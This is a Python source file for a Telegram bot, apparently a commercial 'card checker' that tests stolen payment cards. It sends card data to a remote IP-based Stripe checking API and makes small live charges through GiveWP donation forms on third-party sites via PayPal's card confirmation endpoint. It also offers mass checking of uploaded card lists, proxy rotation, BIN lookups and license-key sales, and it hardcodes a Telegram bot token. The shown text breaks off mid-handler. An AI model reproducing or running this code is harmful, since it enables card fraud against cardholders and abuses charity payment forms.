#!/usr/bin/env python3
# language: Python, file: bot.py, target: cPanel/Python 3.6, python3
# *👑Poriot_ke👑 Multi-Check Bot — Premium Custom Emoji IDs & Sans-Italic Typography*

import os
import time
import requests
import json
import sqlite3
import random
import re
import base64
import uuid
from datetime import datetime, timedelta
from threading import Thread

# Credentials & Config
TG_TOKEN = "8832774495:AAEQZTt3fy9oIK8thDaIP3E4xVvlHzC50qQ"
INITIAL_ADMINS = {5541778617}

SITES_FILE = "sites.txt"
PROXY_FILE = "proxies.txt"
DB_FILE = "checker_bot.db"
STRIPE_API_URL = "http://147.93.53.240:8973/liladmin-str"
BANNER_URL = "https://i.ibb.co/L89Gz7X/banner.jpg"

_CONFIG = {"paypal_amount": "6.00", "sites_pool_enabled": True}

# === PREMIUM EMOJI IDs ===
EMOJI_LOADING = '5195033767969839232'
EMOJI_SUCCESS = '5323307196807653127'
EMOJI_ERROR = '5323535839391653590'
EMOJI_DEAD = '5210952531676504517'

# ===== HIT STATUS EMOJI MAP =====
_HIT_STATUS_EMOJI = {
    "CHARGED": ("5041796412954641308", "💎"),
    "APPROVED": ("5125343104638912114", "✅"),
    "DECLINED": ("5855085385696156087", "❌"),
}

PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "magento", "Convergepay",
    "PaySimple", "oceanpayments", "eProcessing", "hipay", "worldpay", "cybersourse",
    "payjunction", "Authorize.Net", "2Checkout", "Adyen", "Checkout.com", "PayFlow",
    "Payeezy", "usaepay", "creo", "SquareUp", "Authnet", "ebizcharge", "cpay",
    "Moneris", "recurly", "cardknox", "matt sorra", "Chargify", "Paytrace",
    "hostedpayments", "securepay", "eWay", "blackbaud", "LawPay", "clover",
    "cardconnect", "bluepay", "fluidpay", "chasepaymentech", "Auruspay",
    "sagepayments", "paycomet", "geomerchant", "realexpayments", "Rocketgate",
    "Shopify", "WooCommerce", "BigCommerce", "Magento Payments",
    "OpenCart", "PrestaShop", "Razorpay"
]

SECURITY_INDICATORS = {
    'captcha': ['captcha', 'protected by recaptcha', "i'm not a robot", 'recaptcha/api.js'],
    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com']
}

def load_sites():
    if not os.path.exists(SITES_FILE):
        return ["https://azulenaccion.com"]
    with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")] or ["https://azulenaccion.com"]

def save_sites(sites_list):
    with open(SITES_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(sites_list) + "\n")

# Database Layer
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    c.execute("CREATE TABLE IF NOT EXISTS user_stats (user_id INTEGER PRIMARY KEY, total_checked INT DEFAULT 0, charged INT DEFAULT 0, approved INT DEFAULT 0, declined INT DEFAULT 0, custom_proxy TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS proxies (id INTEGER PRIMARY KEY AUTOINCREMENT, proxy_str TEXT UNIQUE, is_active INT DEFAULT 1)")
    c.execute("CREATE TABLE IF NOT EXISTS licenses (key_str TEXT PRIMARY KEY, days INT, created_by INT, is_redeemed INT DEFAULT 0, redeemed_by INT, redeemed_at TEXT)")
    conn.commit()
    c.execute("SELECT COUNT(*) FROM admins")
    if c.fetchone()[0] == 0:
        for aid in INITIAL_ADMINS:
            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (aid,))
        conn.commit()
    conn.close()

def db_get_admins():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM admins")
    rows = c.fetchall()
    conn.close()
    return {r[0] for r in rows}

def is_admin(user_id):
    return user_id in db_get_admins()

def db_get_user_proxy(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT custom_proxy FROM user_stats WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row and row[0] else None

def db_set_user_proxy(user_id, proxy_str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO user_stats (user_id) VALUES (?)", (user_id,))
    c.execute("UPDATE user_stats SET custom_proxy = ? WHERE user_id = ?", (proxy_str, user_id))
    conn.commit()
    conn.close()

def db_remove_user_proxy(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE user_stats SET custom_proxy = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def db_create_licenses(count, days, admin_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    keys = []
    for _ in range(count):
        p1 = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))
        p2 = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=4))
        p3 = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))
        key = f"{p1}-{p2}-{p3}"
        c.execute("INSERT OR IGNORE INTO licenses (key_str, days, created_by) VALUES (?, ?, ?)", (key, days, admin_id))
        keys.append(key)
    conn.commit()
    conn.close()
    return keys

def db_get_all_licenses():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT key_str, days, is_redeemed FROM licenses")
    rows = c.fetchall()
    conn.close()
    return rows

def db_get_user_count():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM user_stats")
    cnt = c.fetchone()[0]
    conn.close()
    return cnt

def db_redeem_license(key_str, user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT days, is_redeemed FROM licenses WHERE key_str = ?", (key_str,))
    row = c.fetchone()
    if not row:
        conn.close()
        return False, f"❌ <b><i>Invalid license key provided.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>"
    days, is_redeemed = row[0], row[1]
    if is_redeemed:
        conn.close()
        return False, "ALREADY_USED"
    c.execute("UPDATE licenses SET is_redeemed = 1, redeemed_by = ?, redeemed_at = ? WHERE key_str = ?", (user_id, datetime.now().isoformat(), key_str))
    conn.commit()
    conn.close()
    return True, days

# Telegram API Helpers
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass

def send_photo(chat_id, photo_url, caption, reply_markup=None):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto"
    payload = {"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        if not r.json().get("ok"):
            send_message(chat_id, caption, reply_markup)
    except Exception:
        send_message(chat_id, caption, reply_markup)

def update_ui_message(message, text, reply_markup=None):
    chat_id = message["chat"]["id"]
    msg_id = message["message_id"]
    has_media = bool(message.get("photo") or message.get("animation") or message.get("document"))
    
    if has_media:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageCaption"
        payload = {"chat_id": chat_id, "message_id": msg_id, "caption": text, "parse_mode": "HTML"}
    else:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageText"
        payload = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": "HTML"}
        
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        if not r.json().get("ok") and has_media:
            url_fallback = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageText"
            payload_fb = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": "HTML"}
            if reply_markup:
                payload_fb["reply_markup"] = json.dumps(reply_markup)
            requests.post(url_fallback, json=payload_fb, timeout=10)
    except Exception:
        pass

def answer_callback(callback_query_id, text=""):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_query_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

# Bin Lookup
def bin_lookup(bin_num):
    info = {"brand": "UNKNOWN", "type": "UNKNOWN", "level": "", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🏳️", "code": "--"}
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=5)
        if res.status_code == 200:
            d = res.json()
            info = {
                "brand": (d.get("brand") or "UNKNOWN").upper(),
                "type": (d.get("type") or "UNKNOWN").upper(),
                "level": (d.get("level") or "").upper(),
                "bank": (d.get("bank") or "UNKNOWN").upper(),
                "country": (d.get("country_name") or "UNKNOWN").upper(),
                "flag": d.get("country_flag") or "🏳️",
                "code": (d.get("country_code") or "--").upper(),
            }
    except Exception:
        pass
    return info

# Stripe $1 Engine
def check_stripe(card, proxy=None):
    params = {"cc": card}
    proxies_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        res = requests.get(STRIPE_API_URL, params=params, proxies=proxies_dict, timeout=30)
        if res.status_code == 200:
            return res.json()
        return {"approved": False, "charged": False, "Price": "1.00", "message": f"HTTP {res.status_code}"}
    except Exception:
        return {"approved": False, "charged": False, "Price": "1.00", "message": "PROXY_OR_CONN_ERR"}

# PayPal $6 GiveWP Engine
def check_paypal(card, proxy=None):
    parts = re.split(r"[|:/\\\-\s]+", card.strip())
    if len(parts) < 4:
        return {"approved": False, "charged": False, "Price": _CONFIG["paypal_amount"], "message": "INVALID_FORMAT"}
    n, mm, yy, cvc = re.sub(r"\D", "", parts[0]), str(parts[1]).zfill(2), str(parts[2])[-2:], re.sub(r"\D", "", parts[3])
    
    target_site = random.choice(load_sites()) if _CONFIG["sites_pool_enabled"] else "https://azulenaccion.com"
    form_url = f"{target_site}/give-form-right-sidebar"
    ajax_url = f"{target_site}/wp-admin/admin-ajax.php"
    pp_amount = _CONFIG["paypal_amount"]

    proxies_dict = {"http": proxy, "https": proxy} if proxy else None

    try:
        s = requests.Session()
        if proxies_dict:
            s.proxies = proxies_dict
        resp = s.get(form_url, headers={"user-agent": "Mozilla/5.0"}, timeout=12)
        html = resp.text
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
        encoded = re.search(r'"data-client-token":"(.*?)"', html).group(1)
        access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(encoded).decode("utf-8")).group(1)
    except Exception:
        return {"approved": False, "charged": False, "Price": pp_amount, "message": "FORM_PARSE_ERR"}

    metadata_id, request_id = uuid.uuid4().hex, uuid.uuid4().hex
    gf = {
        "give-honeypot": "", "give-form-id-prefix": form_prefix, "give-form-id": form_id,
        "give-form-title": "", "give-current-url": form_url, "give-form-url": form_url,
        "give-form-minimum": pp_amount, "give-form-maximum": "999999.99",
        "give-form-hash": form_hash, "give-price-id": "3", "give-recurring-logged-in-only": "",
        "give-logged-in-only": "1", "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": pp_amount, "payment-mode": "paypal-commerce", "give_first": "admin",
        "give_last": "zlal", "give_email": "adminzlall97ab@gmail.com", "card_name": "admin zlal",
        "card_exp_month": "", "card_exp_year": "", "give-gateway": "paypal-commerce",
    }

    try:
        boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
        lines = [f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}" for k, v in gf.items()]
        lines.append(f"--{boundary}--\r\n")
        body = "\r\n".join(lines).encode("utf-8")
        
        r = s.post(ajax_url, params={"action": "give_paypal_commerce_create_order"},
                   headers={"content-type": f"multipart/form-data; boundary={boundary}"}, data=body, timeout=15)
        order_id = r.json()["data"]["id"]
    except Exception:
        return {"approved": False, "charged": False, "Price": pp_amount, "message": "ORDER_ERR"}

    paypal_headers = {
        "authorization": f"Bearer {access_token}",
        "braintree-sdk-version": "3.32.0-payments-sdk-dev",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "paypal-client-metadata-id": metadata_id,
        "paypal-request-id": request_id,
    }
    payload = {
        "payment_source": {
            "card": {
                "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
                "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
            }
        },
        "application_context": {"vault": False},
    }

    try:
        confirm_resp = s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                              headers=paypal_headers, json=payload, timeout=15)
        c_json = confirm_resp.json()
    except Exception:
        return {"approved": False, "charged": False, "Price": pp_amount, "message": "CONFIRM_ERR"}

    name = c_json.get("name", "")
    status = c_json.get("status", "")
    details = c_json.get("details") or []

    if name == "INSTRUMENT_DECLINED":
        issue = details[0].get("issue", "INSTRUMENT_DECLINED") if details else "INSTRUMENT_DECLINED"
        return {"approved": False, "charged": False, "Price": pp_amount, "message": issue}
    if status in ("APPROVED", "COMPLETED"):
        return {"approved": True, "charged": True, "Price": pp_amount, "message": "PAYMENT_SUCCESSFUL"}
    return {"approved": False, "charged": False, "Price": pp_amount, "message": name or status or "DECLINED"}

# Callback Handler
def handle_update(update):
    if "callback_query" in update:
        cq = update["callback_query"]
        cq_id = cq["id"]
        data = cq.get("data", "")
        message = cq.get("message", {})
        chat_id = message.get("chat", {}).get("id")
        user_id = cq.get("from", {}).get("id")
        user = cq.get("from", {})
        uname = user.get("username", "User")

        if data == "menu_cmds":
            text = (
                f"<b><i>🌐 C O M M A N D   M E N U 🌐</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n\n"
                "<b><i>)) /st1 cc|mm|yy|cvv</i></b>\n"
                "└ <b><i>Shopify/Stripe Checker Single ($1)</i></b>\n\n"
                "<b><i>)) /mst</i></b>\n"
                "└ <b><i>Mass Stripe Checker (Reply .txt)</i></b>\n\n"
                "<b><i>)) /pp cc|mm|yy|cvv</i></b>\n"
                "└ <b><i>PayPal GiveWP Checker ($6)</i></b>\n\n"
                "<b><i>)) /mpp</i></b>\n"
                "└ <b><i>Mass PayPal Checker (Reply .txt)</i></b>\n\n"
                "<b><i>)) /gate https://targetsite.com</i></b>\n"
                "└ <b><i>Single Gateway Scanner</i></b>\n\n"
                "<b><i>)) /mgate</i></b>\n"
                "└ <b><i>Mass Gateway Scanner (Reply .txt)</i></b>\n\n"
                "<b><i>)) /bin 123456</i></b>\n"
                "└ <b><i>BIN Lookup Info</i></b>\n\n"
                "<b><i>)) /f [message]</i></b>\n"
                "└ <b><i>Send Feedback to Admin</i></b>\n\n"
                "<b><i>)) /cmds</i></b>\n"
                "└ <b><i>Show This Full Command Menu</i></b>\n"
                "<b>====================================</b>"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "menu_start"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "menu_proxy":
            text = (
                f"<b><i>🌐 P R O X Y   M A N A G E R 🌐</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                "• <b><i>Manage your proxy settings:</i></b>\n\n"
                "<b><i>= </i></b> <code>/proxy host:port:user:pass</code>\n"
                "<b><i>= </i></b> <code>/myproxy</code> → <b><i>View Current Proxy</i></b>\n"
                "<b><i>= </i></b> <code>/rmproxy</code> → <b><i>Remove Current Proxy</i></b>\n"
                "<b><i>= </i></b> <code>/chkpxy</code> → <b><i>Check Current Proxy</i></b>\n"
                "<b>====================================</b>\n\n"
                "<b><i>Proxy Will Be Tested Before Saving</i></b>"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "menu_start"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "menu_profile":
            proxy = db_get_user_proxy(user_id)
            proxy_status = "1/1" if proxy else "0/30"
            text = (
                f"<b><i>🥸 U S E R   P R O F I L E 🥸</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                f"<b><i>= </i> Name →</b> {user.get('first_name', 'User')}\n"
                f"<b><i>= </i> Username →</b> @{uname}\n"
                f"<b><i>= </i> ID →</b> {user_id}\n"
                "<b>====================================</b>\n"
                "👑 <b><i>Status →</i></b> Free\n"
                f"🌐 <b><i>Saved Proxies →</i></b> {proxy_status}\n"
                "<b>====================================</b>"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "menu_start"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "admin_main":
            if not is_admin(user_id):
                answer_callback(cq_id, "Unauthorized")
                return
            admin_text = (
                f"<b><i>👑 A D M I N   C O N T R O L   P A N E L 👑</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                "<b><i>Select a management submenu below:</i></b>"
            )
            markup = {
                "inline_keyboard": [
                    [{"text": "🔑 License Keys", "callback_data": "admin_keys"}, {"text": "🌐 Sites Pool", "callback_data": "admin_sites"}],
                    [{"text": "📊 User Stats", "callback_data": "admin_users"}, {"text": "💵 Set PP Amount", "callback_data": "admin_amount"}],
                    [{"text": "🔻 Close", "callback_data": "menu_close"}]
                ]
            }
            update_ui_message(message, admin_text, markup)
            answer_callback(cq_id)

        elif data == "admin_keys":
            if not is_admin(user_id):
                answer_callback(cq_id, "Unauthorized")
                return
            licenses = db_get_all_licenses()
            key_list_str = "\n".join([f"• <code>{k[0]}</code> ({k[1]}d) - {'Used' if k[2] else 'Active'}" for k in licenses[:10]]) or "No keys generated."
            text = (
                f"<b><i>🔑 L I C E N S E   K E Y S 🔑</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                f"{key_list_str}\n\n"
                "<b><i>To Generate:</i></b> <code>/genkeys [count] [days]</code>"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "admin_main"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "admin_sites":
            if not is_admin(user_id):
                answer_callback(cq_id, "Unauthorized")
                return
            sites = load_sites()
            site_list_str = "\n".join([f"• <code>{s}</code>" for s in sites[:15]])
            text = (
                f"<b><i>🌐 S I T E S   P O O L (sites.txt) 🌐</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                f"{site_list_str}\n\n"
                "<b><i>To Add:</i></b> <code>/addsite https://target.com</code>"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "admin_main"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "admin_users":
            if not is_admin(user_id):
                answer_callback(cq_id, "Unauthorized")
                return
            u_count = db_get_user_count()
            text = (
                f"<b><i>📊 U S E R   S T A T S 📊</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                f"• <b><i>Total Registered Users:</i></b> {u_count}\n"
                f"• <b><i>System Admins:</i></b> {len(db_get_admins())}"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "admin_main"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "admin_amount":
            if not is_admin(user_id):
                answer_callback(cq_id, "Unauthorized")
                return
            text = (
                f"<b><i>💵 P A Y P A L   A M O U N T 💵</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                f"• <b><i>Current Target Amount:</i></b> ${_CONFIG['paypal_amount']} USD\n\n"
                "<b><i>To Change:</i></b> <code>/setamount 10.00</code>"
            )
            markup = {"inline_keyboard": [[{"text": "🔻 Back", "callback_data": "admin_main"}]]}
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "menu_start":
            text = (
                f"<b><i>🌈 W E L C O M E 🌈</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
                "<b>====================================</b>\n"
                "<b><i>)) Name →</i></b> Bandit 👑\n"
                "<b><i>⚡️ Status →</i></b> <i>Online & Ready</i> 👑\n"
                "<b>====================================</b>\n\n"
                "☑️ <b><i>Use the menu below to get started:</i></b>"
            )
            markup = {
                "inline_keyboard": [
                    [{"text": "👑 Cmds", "callback_data": "menu_cmds"}, {"text": "❤️ Proxy", "callback_data": "menu_proxy"}],
                    [{"text": "🔄 My Profile", "callback_data": "menu_profile"}, {"text": "👑 Dev ↗", "url": "https://t.me/nativecodes"}]
                ]
            }
            update_ui_message(message, text, markup)
            answer_callback(cq_id)

        elif data == "menu_close":
            try:
                url = f"https://api.telegram.org/bot{TG_TOKEN}/deleteMessage"
                requests.post(url, json={"chat_id": chat_id, "message_id": message["message_id"]}, timeout=5)
            except Exception:
                pass
            answer_callback(cq_id)
        return

    if "message" not in update:
        return
    msg = update["message"]
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    user = msg.get("from", {})
    uname = user.get("username", "User")
    text = msg.get("text", "").strip()

    # /start & /cmds
    if text.startswith("/start") or text.startswith("/cmds"):
        start_caption = (
            f"<b><i>🌈 W E L C O M E 🌈</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
            "<b>====================================</b>\n"
            "<b><i>)) Name →</i></b> Bandit 👑\n"
            "<b><i>⚡️ Status →</i></b> <i>Online & Ready</i> 👑\n"
            "<b>====================================</b>\n\n"
            "☑️ <b><i>Use the menu below to get started:</i></b>"
        )
        markup = {
            "inline_keyboard": [
                [{"text": "👑 Cmds", "callback_data": "menu_cmds"}, {"text": "❤️ Proxy", "callback_data": "menu_proxy"}],
                [{"text": "🔄 My Profile", "callback_data": "menu_profile"}, {"text": "👑 Dev ↗", "url": "https://t.me/nativecodes"}]
            ]
        }
        send_photo(chat_id, BANNER_URL, start_caption, markup)

    # /admin Panel
    elif text.startswith("/admin"):
        if not is_admin(user_id):
            send_message(chat_id, f"❌ <b><i>Unauthorized.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return
        admin_caption = (
            f"<b><i>👑 A D M I N   C O N T R O L   P A N E L 👑</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
            "<b>====================================</b>\n"
            "<b><i>Select a management submenu below:</i></b>"
        )
        markup = {
            "inline_keyboard": [
                [{"text": "🔑 License Keys", "callback_data": "admin_keys"}, {"text": "🌐 Sites Pool", "callback_data": "admin_sites"}],
                [{"text": "📊 User Stats", "callback_data": "admin_users"}, {"text": "💵 Set PP Amount", "callback_data": "admin_amount"}],
                [{"text": "🔻 Close", "callback_data": "menu_close"}]
            ]
        }
        send_photo(chat_id, BANNER_URL, admin_caption, markup)

    # Single Checkers
    elif text.startswith("/st1") or text.startswith("/sh") or text.startswith("/pp"):
        is_pp = text.startswith("/pp")
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, f"<b><i>Usage:</i></b> <code>{'/pp' if is_pp else '/st1'} 4000000000000000|01|28|123</code>")
            return
        card = parts[1].strip()
        send_message(chat_id, f"<b><i>⏳ Checking card on {'PayPal GiveWP ($6)' if is_pp else 'Stripe ($1)'}...</i></b> <emoji id='{EMOJI_LOADING}'></emoji>")
        
        proxy = db_get_user_proxy(user_id)
        bin_num = re.sub(r"\D", "", card)[:6]

        res = check_paypal(card, proxy=proxy) if is_pp else check_stripe(card, proxy=proxy)
        bin_info = bin_lookup(bin_num)

        is_ch = bool(res.get("charged"))
        is_ap = bool(res.get("approved"))
        
        status_key = "CHARGED" if is_ch else ("APPROVED" if is_ap else "DECLINED")
        emoji_id, fallback_emoji = _HIT_STATUS_EMOJI[status_key]
        status_txt = f"{status_key} {fallback_emoji} <emoji id='{emoji_id}'></emoji>"

        caption = (
            f"<b><i>{'🔥 CHARGED HIT' if is_ch else '✅ APPROVED HIT'} — 👑Poriot_ke👑</i></b>\n"
            f"====================================\n"
            f"🃏 <b>Card:</b> <code>{card}</code>\n"
            f"💸 <b>Status:</b> {status_txt}\n"
            f"🖥 <b>Response:</b> <code>{res.get('message')}</code>\n"
            f"🌐 <b>Gateway:</b> {'PayPal GiveWP' if is_pp else 'Shopify Stripe'}\n"
            f"------------------------------------\n"
            f"ℹ️ <b>Info:</b> {bin_info['brand']} | {bin_info['type']}\n"
            f"🏦 <b>Bank:</b> {bin_info['bank']}\n"
            f"🌍 <b>Country:</b> {bin_info['country']} {bin_info['flag']}\n"
            f"💵 <b>Price:</b> ${res.get('Price', '6.00' if is_pp else '1.00')}\n"
            f"====================================\n"
            f"⚙️ <b>Dev:</b> @Poriot_ke 🇰🇪"
        )
        if is_ch or is_ap:
            send_photo(chat_id, BANNER_URL, caption)
        else:
            send_message(chat_id, caption)

    # Mass Checkers
    elif text.startswith("/mst") or text.startswith("/msh") or text.startswith("/mpp"):
        is_pp = text.startswith("/mpp")
        if not msg.get("reply_to_message") or not msg["reply_to_message"].get("document"):
            send_message(chat_id, f"<b><i>Usage:</i></b> Reply to a <code>.txt</code> file containing cards with <code>{'/mpp' if is_pp else '/mst'}</code>")
            return
        
        doc = msg["reply_to_message"]["document"]
        file_id = doc["file_id"]
        try:
            f_res = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/getFile?file_id={file_id}", timeout=10).json()
            file_path = f_res["result"]["file_path"]
            file_bytes = requests.get(f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}", timeout=30).content
            cards = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]
        except Exception:
            send_message(chat_id, f"❌ <b><i>Failed to download file.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return

        if not cards:
            send_message(chat_id, f"❌ <b><i>No valid cards found in file.</i></b> <emoji id='{EMOJI_ERROR}'></emoji>")
            return

        total = len(cards)
        progress_msg = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": f"<b><i>⏳ Mass Check Started for {total} cards...</i></b> <emoji id='{EMOJI_LOADING}'></emoji>", "parse_mode": "HTML"}).json()
        p_msg_id = progress_msg.get("result", {}).get("message_id")

        proxy = db_get_user_proxy(user_id)
        charged = 0
        approved = dg_3ds = declined = 0

        start_time = time.time()
        for card in cards:
            res = check_paypal(card, proxy=proxy) if is_pp else check_stripe(card, proxy=proxy)
            if res.get("charged"):
                charged += 1
            elif res.get("approved"):
                approved += 1
            elif "3DS" in str(res.get("message")):
                dg_3ds += 1
            else:
                declined += 1

        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)
        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"

        report = (
            f"[=] <b>Mass Check</b> ~ Done ~ ✔️ <emoji id='{EMOJI_SUCCESS}'></emoji>\n"
            "----------------------------------------\n"
            f"[=] <b>Total</b> ~ {total}\n"
            f"[=] <b>Charged</b> ~ {charged}\n"
            f"[=] <b>Approved</b> ~ {approved}\n"
            f"[=] <b>3DS</b> ~ {dg_3ds}\n"
            f"[=] <b>Declined</b> ~ {declined}\n"
            f"[=] <b>Time</b> ~ {time_str} ~ ⏳\n"
            "----------------------------------------\n"
            f"[=] <b>Checker</b> ~ 👾 @{uname}"
        )
        if charged > 0 or approved > 0:
            send_photo(chat_id, BANNER_URL, report)
        elif p_msg_id:
            update_ui_message(progress_msg.get("result", {}), report)
        else:
            send_message(chat_id, report)

    # Proxy Management
    elif text.startswith("/proxy"):
        parts = text.split(" ", 1)
        if len(parts) < 2:
            proxy_msg = (
                f"<b><i>🌀 I n v a l i d   F o r m a t 🌀</i></b> <emoji id='{EMOJI_ERROR}'></emoji>\n"
                "<b>====================================</b>\n"
                "<b><i>)) Please provide a proxy list with the command.</i></b>\n\n"
                "📌 <b><i>Supported Formats:</i></b>\n"
                "<b><i>= </i></b> IP:PORT\n"
                "<b><i>= </i></b> IP:PORT:USER:PASS\n"
                "<b><i>= </i></b> USER:PASS@IP:PORT\n\n"
                "<b>Supported Types →</b> HTTP / SOCKS4 / SOCKS5\n"
                "📊 <b>Max Limit →</b> 30 Proxies per user (Line by Line)\n\n"
                "💡 <b><i>Example:</i></b>\n"
                "<code>/proxy 198.51.100.1:8080</code>\n"
                "<b>====================================</b>"
            )
            send_message(chat_id, proxy_msg)
            return
        new_proxy = parts[1].strip()
        db_set_user_proxy(user_id, new_proxy)
        send_message(chat_id, f"✅ <b><i>Proxy successfully updated and saved:</i></b> <emoji id='{EMOJI_SUCCESS}'></emoji>\n<code>{new_proxy}</code>")

    elif text.startswith("/myproxy"):
        proxy = db_get_user_proxy(user_id)
        if proxy:
            send_message(chat_id, f"🌐 <b><i>Current Saved Proxy:</i></b>\n<code>{proxy}</code>")
        else:
            send_message(chat_id, f"⚠️ <b><i>No proxy configured.</i></b> Set one using <code>/proxy host:port:user:pass</code> <emoji id='{EMOJI_ERROR}'></emoji>")

    elif text.startswith("/rmproxy"):
        db_remove_user_proxy(user_id)
        rm_msg = (
            f"<b>🗑 Proxies Removed 🗑</b> <emoji id='{EMOJI_DEAD}'></emoji>\n"
            "====================================\n"
            "All your saved proxies have been deleted successfully.\n\n"
            "🌐 <b>Removed →</b> 0\n"
            "====================================\n"
            "🚀 <b>You can now add a fresh list.</b>"
        )
        send_message(chat_id, rm_msg)

    elif text.startswith("/bin"):
        parts = text.split(" ", 1)
        if len(parts) < 2:
            send_message(chat_id, "<b><i>Usage:</i></b> <code>/bin 400000</code>")
            return
        bin_num = re.sub(r"\D", "", parts[1])[:6]
        b_info = bin_lookup(bin_num)
        bin_rep = (
